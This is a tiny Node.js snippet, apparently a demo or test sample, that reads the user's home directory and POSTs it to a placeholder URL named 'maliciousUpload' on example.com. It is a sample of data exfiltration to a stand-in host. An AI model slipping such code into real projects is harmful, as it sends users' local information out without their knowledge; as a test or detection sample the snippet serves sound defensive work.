const os = require('os')

const homedir = os.homedir()
console.log('Homedir:', homedir)

// upload
fetch(
  'http://example.com/maliciousUpload',
  {
    method: 'post', 
    body: { homedir }
  }
)
